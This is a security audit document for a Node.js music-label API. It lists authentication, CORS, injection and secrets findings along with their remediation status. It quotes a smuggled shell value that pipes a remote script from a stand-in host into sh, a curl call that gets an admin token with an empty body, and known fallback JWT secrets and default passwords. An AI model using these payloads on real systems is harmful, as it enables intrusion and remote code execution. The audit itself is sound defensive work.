# SECURITY_AUDIT.md

Read-only review. Severity is my assessment for a real deployment of the canonical
entrypoint `mau5trap-production-api.js`. Nothing here was exploited against a live
system — findings are from source plus isolated local reproductions of the exact code.

---

## Phase 3 remediation status

The findings below were written against the pre-Phase-3 tree. Phase 3 remediated
most of them; the disposition is recorded here so the body of this audit remains
an accurate historical record of the original defects.

| Finding | Phase 3 disposition |
|---|---|
| CRITICAL-1 (empty-body admin login) | FIXED — empty body 401; override requires both env vars |
| CRITICAL-2 (hardcoded JWT fallback) | FIXED — no fallback; fail-fast in every env |
| CRITICAL-3 (pm2 dev-mode default) | NOT ADDRESSED (deployment config, out of scope) |
| HIGH-4 (artistAccess scalar vs array) | FIXED — scalar normalized fail-closed |
| HIGH-5 (CORS origin:true) | FIXED — ALLOWED_ORIGINS policy |
| HIGH-6 (autoPrint shell injection) | FIXED — execFile(args[]) |
| HIGH-7 (unbounded AI spend) | NOT ADDRESSED (quota, out of scope) |
| MEDIUM-8 (reset enumeration) | FIXED — generic 200 |
| MEDIUM-9 (err.message leak) | FIXED — generic bodies, server-side logging |
| MEDIUM-10 (committed secrets) | NOT ADDRESSED (legacy files retained by instruction) |
| MEDIUM-11 (no input validation) | PARTIAL — zod on 2 routes (see PHASE_3_VALIDATION.md §6) |
| NEW-1 (user create 500) | FIXED |
| NEW-2 (PDF crash) | FIXED |

Verification detail: `PHASE_3_VALIDATION.md`.

---

## CRITICAL-1 — Unauthenticated admin token via empty request body

**Location:** `mau5trap-production-api.js:481-488`

```js
// Admin Override
if (email === process.env.ADMIN_EMAIL && password === process.env.ADMIN_PASS) {
    const token = jwt.sign({ email, role: 'admin', artistAccess: 'all', integrationCount: 10 },
                           JWT_SECRET, { expiresIn: '24h' });
    return res.json({ token, user: { name: 'Admin', email, role: 'admin', pageAccess: ['all'] } });
}
```

When `ADMIN_EMAIL` and `ADMIN_PASS` are unset, both sides are `undefined`. A `POST` with
body `{}` destructures `email`/`password` to `undefined` (L479), and
`undefined === undefined` is **true**. Reproduced exactly:

```
With ADMIN_EMAIL/ADMIN_PASS UNSET:
  normal creds       : falls through to DB lookup
  JSON {} empty body : *** ADMIN TOKEN GRANTED ***
  destructured {}    : *** ADMIN TOKEN GRANTED ***
```

`POST /v3/auth/login` is unauthenticated (L478). The issued token carries
`role: 'admin'` and `artistAccess: 'all'`, which passes `hasArtistAccess` (L448),
`filterDataByAccess` (L458), `checkExportAccess` (L2541) and all 15 inline admin gates.

**Why this is the default state, not an edge case:**
- `.env` is absent from the repo and gitignored (`.gitignore:2`).
- Neither `.env.example` nor `.env.prod.template` declares `ADMIN_EMAIL` or `ADMIN_PASS`,
  so an operator following the documentation never sets them.
- The L215 startup guard checks only `JWT_SECRET`, not these.

Anyone following `QUICKSTART.md` gets a server where `curl -X POST .../v3/auth/login -d
'{}' -H 'Content-Type: application/json'` returns an admin session. Note the JWT is
signed with the L411 fallback secret in that same scenario, so it is also forgeable
(CRITICAL-2).

---

## CRITICAL-2 — Hardcoded JWT fallback secret

**Location:** `mau5trap-production-api.js:411`

```js
const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-change-this';
```

Also `Server v5.js:14`: `process.env.JWT_SECRET || 'mau5-secure-secret'`.

The production guard (L215-218) only fires when `NODE_ENV === 'production'`. Any
deployment that omits or misspells `NODE_ENV` — Railway/Render/Heroku defaults, PM2
`env` block which sets `NODE_ENV: 'development'` (`ecosystem.config.js:10`) — boots with
a publicly known signing key. Anyone can forge
`{ role: 'admin', artistAccess: 'all' }` and authenticate to every route.

`PRODUCTION_DEPLOYMENT.md` claims "Env Validation: Ensures no insecure defaults." That
is true only under one specific `NODE_ENV` value.

---

## CRITICAL-3 — `pm2 start ecosystem.config.js` runs in development mode

**Location:** `ecosystem.config.js:9-14`

```js
env:            { NODE_ENV: 'development' },
env_production: { NODE_ENV: 'production' }
```

`PRODUCTION_DEPLOYMENT.md` gives the correct command
(`pm2 start ecosystem.config.js --env production`), but the default `env` block means
any invocation without `--env production` starts a "production" cluster with:
- the L411 fallback JWT secret accepted (CRITICAL-2),
- the L1295 AI dev-fallback active, **fabricating analytics answers** as `success: true`,
- console logging enabled (L231).

Compounding: `instances: 'max'` + `exec_mode: 'cluster'` (L5-6) against wholly in-memory
A&R/campaign/sales state (see ARCHITECTURE_AUDIT §3) means writes land on random workers
and silently disappear.

---

## HIGH-4 — Broken authorization denies artists their own data

**Location:** `mau5trap-production-api.js:447-454` vs model L151 and seed L189

`User.artistAccess` is `DataTypes.STRING`; the seeded artist gets `'art_rezz'`.
`hasArtistAccess` only handles `'all'` or an **array**, so a scalar string falls through
to `return false`. Verified:

```
seeded artist user can access art_rezz?     false
seeded artist user can access art_deadmau5? false
```

This is a fail-closed bug (not a privilege escalation), but it means the entire
artist-facing premise of the platform is non-functional: `GET /v3/artists` returns `[]`,
and all six artist-scoped routes 403. Listed as HIGH because the obvious "fix" — making
the comparison work — is exactly where a fail-open mistake would be introduced.

---

## HIGH-5 — CORS reflects any origin with credentials

**Location:** `mau5trap-production-api.js:246-249`

```js
app.use(cors({ origin: true, credentials: true }));   // "Allow all origins (including file://)"
```

`origin: true` reflects the caller's `Origin` header. Combined with
`credentials: true`, any website can issue credentialed cross-origin requests to the API.
Tokens are held in `localStorage` (terminal dashboard L98), so the practical vector is a
malicious page reading a reflected response after an XSS or a user-initiated fetch rather
than automatic cookie replay — but the configuration is still wrong.

`ALLOWED_ORIGINS` is documented in `.env.prod.template:4` and
`PRODUCTION_DEPLOYMENT.md` ("Cors: Strict origin checking in production") and is
**never read anywhere in the codebase** — verified by grep.

---

## HIGH-6 — Command injection surface in report auto-printing

**Location:** `mau5trap-production-api.js:2505-2528`

```js
printCommand = `powershell -Command "Start-Process -FilePath '${filepath}' -Verb Print"`;  // L2513
printCommand = `lpr "${filepath}"`;                                                        // L2516
printCommand = `lp "${filepath}"`;                                                         // L2519
exec(printCommand, ...);                                                                   // L2522
```

`filepath` is interpolated into a shell string with no escaping. The sole caller (cron
L2494) builds it from `${artist.name}_${month}_report.pdf` (L2487), and `artist.name`
is attacker-controllable via `POST /v3/artists` (L767, admin-only, unvalidated body
into a JSON column). A name containing `"; curl evil.sh | sh; #` reaches `exec`.

Mitigating: requires `AUTO_PRINT === 'true'` (L2493) **and** admin (or CRITICAL-1), and
fires only on the 1st of the month at 03:00. Not currently reachable in a default
deploy — but it is a live code path, not dead code.

---

## HIGH-7 — Unbounded third-party spend by any authenticated user

No per-user quota exists anywhere. The only limiter is global: 1000 requests/hour/IP on
`/v3/` (L259-263). Any authenticated user — including `role: 'viewer'`, the model default
(L150) — can drive operator-billed cost:

| Endpoint | Cost per call | Guard |
|---|---|---|
| `POST /v3/ai/query` (L1224) | 1 Groq completion, 300 tok | JWT only |
| `GET /v3/artists/:id/entity-audit?refresh=true` (L1037, L1040) | 5 external APIs (Google KG, Wikipedia, Discogs, Genius, Fandom) + 1 Groq completion | JWT only |

The refresh flag deliberately bypasses the 2-week cache (L1046). The code comments at
L1098 and L1065 show the author was thinking about cost ("let them know money is being
spent", "I paid money, give me everything fresh") but no enforcement was implemented.

---

## MEDIUM-8 — User enumeration on password reset

**Location:** `mau5trap-production-api.js:576`

```js
if (!user) return res.status(404).json({ error: 'User not found' });
```

Unauthenticated (L572) and distinguishes registered from unregistered emails. Standard
practice is an unconditional 200.

Related — the reset flow is also **entirely non-functional**: the token minted at L578
is emailed as a link to the hardcoded `http://localhost:8080/reset-password?token=...`
(L583), and the frontend's `POST /v3/auth/reset-password`
(`mau5trap-frontend-connected.html:2998`) has **no server route**. The token can never
be redeemed. Broken-and-leaky rather than exploitable for takeover.

---

## MEDIUM-9 — Internal error details returned to clients

**Locations:** L3161-3167 (global handler), L1138, L1305, L2022

```js
app.use((err, req, res, next) => {
    res.status(500).json({ error: 'Internal server error', message: err.message });  // L3165
});
```

Sequelize errors leak table/column names and SQL fragments; `err.message` from the Groq
SDK can include request metadata. `POST /v3/ai/query` returns `details: err.message`
(L1305) unconditionally.

---

## MEDIUM-10 — Secrets and credentials committed to the repository

| Item | Location | Note |
|---|---|---|
| `clientId: 'your-client-id'`, `clientSecret: 'your-client-secret'` | api L2693-2694 | placeholders, but a live-path client (`GET /v3/anr/scout`) |
| `password: 'admin'`, `password: 'demo'` | `Server v5.js:25-26` | **plaintext passwords in a user table**, no hashing |
| `admin123` / `rezz123` / `mau5123` | api L3199-3201 banner; `MASTER_GUIDE.md:130,315`; `PRODUCTION_FEATURES.md:50,295,398`; `check_api_health.js:10,25`; `verify_*.js` | seeded defaults documented in 6+ files |
| `SIMULATION_TOKEN_123` | terminal dashboard L107 | client-side fake token, self-assigns `role:'admin'` in UI |
| Spotify artist IDs, YouTube channel IDs, IG/TikTok handles | `integrations/index.js:12-30` | public identifiers, not secrets |

No live API keys were found in tracked files (`sk-` pattern: 0 hits). `.gitignore`
correctly excludes `.env`, `*.pem`, `*.key`, `token*.json`, `*.sqlite`.

Seeding (L183-190) is gated on `User.count() === 0`, so `admin123` is created on any
fresh database — including a first production boot. The banner tells the operator to
change them (L3203) after they are already live.

---

## MEDIUM-11 — No input validation on any endpoint

`zod` is a declared dependency and is used in exactly one place
(`modules/SafeStatsSchema.js`, applied to Spotify responses only). **No request body,
query param, or path param is validated anywhere.**

Concrete consequences:
- `POST /v3/artists` (L767) writes an arbitrary client-supplied object into
  `Artist.data` (a JSON column). No shape, size, or type constraint.
- `PUT /v3/artists/:id/image` (L840) accepts an arbitrary image URL/value — no URL
  validation, so stored values flow to the frontend (`img src`) unchecked.
- `GET /v3/artists` (L730) passes `limit`/`offset` to `parseInt` (L752) with no bounds;
  `NaN` from garbage input makes `.slice(NaN, NaN)` return `[]`, and no upper bound means
  `limit=999999999` is accepted.
- `express.json()` (L250) is called with **no `limit` option** → default 100kb. Better
  than `Server v5.js:18` which sets `'50mb'`.

---

## LOW-12 — Weak / missing hardening details

| Item | Location | Note |
|---|---|---|
| `helmet()` with defaults | L242 | reasonable; no CSP tuning for the inline-script dashboards, which will violate any real CSP |
| No HTTPS enforcement | — | no HSTS config beyond helmet defaults, no redirect |
| bcrypt cost 10 | L185-186 | acceptable, slightly low for 2026 |
| Token expiry 24h | L483, L505 | long-lived; **no refresh, no revocation, no blocklist** |
| JWT has no `id` claim | L483, L500 | see ARCHITECTURE_AUDIT §6 — `req.user.id` is `undefined`, so `userIntegrations[undefined]` (L1194) becomes **one shared bucket for all users**, and GDPR delete (L607) / change-password (L649) silently fail |
| No CSRF protection | — | mitigated by `Authorization` header rather than cookies |
| No audit log of authz decisions | — | winston logs requests (L253-256), not denials |
| `logs/` directory absent | L226-227 | winston `File` transports have no `mkdirSync`; write failure |
| Password reset token in URL query | L583 | ends up in referrers/history (moot — flow is broken) |

---

## Runtime-stability problems (not security, but production-fatal)

| # | Problem | Location | Impact |
|---|---|---|---|
| R1 | `npm start` → `node server.js`, file absent | `package.json:5` | **verified `EXIT: 1`** — documented start path fails |
| R2 | `initDB()` called before `logger` and `labelData` are initialised | L212 vs L221, L343 | works only because `await` at L177 defers past module eval; **any reordering → boot-time `ReferenceError`** |
| R3 | In-place `.sort()` on shared `labelData.artists` | L900, L903, L906, L2582 | verified global mutation; roster order changes permanently per request, differently per PM2 worker → nondeterministic pagination |
| R4 | `sequelize.sync({ alter: true })` on every boot | L179 | runtime schema mutation, no migrations; destructive on column type changes |
| R5 | `Stats` never written (sync loop unregistered) | `sync/masterLoop.js` | projections endpoint (L3058) has no history; README's stated feature is inoperative |
| R6 | All A&R/campaign/sales/integration state in process memory | L1383, L1398, L1722, L2796, L3041, L402 | lost on restart; incoherent under clustering |
| R7 | Two competing A&R vote stores, both written by one UI | L1398 vs L1722 | divergent vote data with incompatible semantics |
| R8 | Groq JSON contract unenforced | L1108, L1117 | `JSON.parse` on raw model prose; silently degrades to a stub |
| R9 | 5 shadowed routes | L1671, L1771, L1311, L1785, L1805 | intended behaviour (e.g. `pageAccess` persistence, AI aliasing) silently absent |
| R10 | Email sends are simulated but reported as success | L540-542, L564 | `sendEmail` returns `true` after only console-logging |

---

## Positive findings

- `.gitignore` is correct and comprehensive; no live secrets are tracked.
- `bcrypt` is used properly in the canonical server (L185, L494) — no plaintext
  comparison (unlike `Server v5.js`).
- `helmet` and `compression` are wired.
- `modules/entityAudit.js` follows strict null-over-guess discipline
  (L86-89, L111, L158, L223-224, L310).
- External HTTP calls in `axios`-based integrations set `timeout: 5000`
  (missing only in `youtube.js`).
- `SafeStatsSchema` + `sync/masterLoop.js` show the right validate-then-persist
  pattern — it is simply not wired into the app.
